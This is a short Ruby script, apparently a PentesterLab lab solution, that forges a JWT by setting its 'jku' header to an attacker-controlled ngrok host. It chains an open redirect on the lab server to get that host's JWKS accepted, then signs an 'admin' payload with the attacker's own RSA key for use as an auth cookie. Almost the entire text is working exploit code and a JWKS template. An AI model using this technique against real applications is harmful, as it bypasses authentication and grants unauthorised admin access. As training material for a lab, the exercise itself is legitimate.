# eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vcGVudGVzdGVybGFiLmNvbS8ud2VsbC1rbm93bi9qd2tzLmpzb24ifQ.eyJ1c2VyIjoidGVzdCJ9.MBMDAWYiCeYQdiqyDQXDGHiQK4GJWU-z0Lf2eJoaYEUSWDH7XgWgFPXSHuU7mFxk9qXrx4xVqHBXJ4otD9AkUgdL-fguh55cexgutZPoZUIjLXh9mCPuG4pUXxpz0hUY8AyMd8IcB-_pjDcphWZPzP8iFm2VBYmcf8ojIYlXyvTn2Ms2te_YhYoBKiDgtm0gOcbt9v-DA4tF0kjfWT51exkqfZT37ZHBcA_vu5MyhJpbvFnWJnsAPZZUDDMvGkI7ZAauiPgxX5Td5oROSxCFjRzbKV9-y53HEqVkA2t-GpTbDNVqKUa09lPkxwKkUA0gSIHuZH6mSVRakKQEVgzQtQ

#openredirect => http://ptl-17994f50-32958416.libcurl.so/redirect?redirect_uri=https://f3e6-73-129-14-72.ngrok.io/jwks.json
# 

header = {"typ":"JWT","alg":"RS256","jku":"https://f3e6-73-129-14-72.ngrok.io/mykey.json"} # insert public server with key (can get the format from the original "jku")
payload = {"user":"admin","iat": 1637380130}

require 'openssl'
require 'base64'
require 'json'

token = Base64.urlsafe_encode64(header.to_json).gsub(/=+$/,"")+"."
token+= Base64.urlsafe_encode64(payload.to_json).gsub(/=+$/,"")
# openssl genrsa -out private.pen 2048  
priv=OpenSSL::PKey::RSA.new File.read 'private.pem'

pub = priv.public_key
n=Base64.urlsafe_encode64(pub.n.to_s(2)).gsub(/=+$/,"")
e=Base64.urlsafe_encode64(pub.e.to_s(2)).gsub(/=+$/,"")

puts n
puts e

sign = priv.sign("SHA256",token)
puts token+"."+Base64.urlsafe_encode64(sign).gsub(/=+$/,"") # use this as new auth cookie

# mykey.json (replace the n or e from output above)
# {
#   "keys": [
#     {
#       "kty": "RSA",
#       "use": "sig",
#       "kid": "pentesterlab",
#       "n": "rQG4QTMoZhWOFAKyXObuN3XH2nbAhQcOCYenm3dy-dGpEpkLQ8jnH7cU4eAI3YG3hTx4VFO_UdqX4EFk31HCrOpRrRyzkwq9A21Yf09Y1AsJes00YQIZUojUcDrA3TZZgnOwZvkc0rkQOTRmTuja1kRxiZM9SpolehDg1nszwd8Jo4fvAsiG3L9SdGxPEERHOrHZbvq_WeFOBDbAcT8ICmThiM6aA6AAwpRfmwruBygzyUS1JstfsEIsysTnft0zsV5ukYlTvaQbC1XtoMgRVAJ5-IGajSBYXMtLM89yxutk-RA_YHSc-IL38sZ5loJEA11S-uUiCyslcju0LqRbPQ",
#       "e": "AQAB",
#       "alg": "RS256"
#     }
#   ]
# }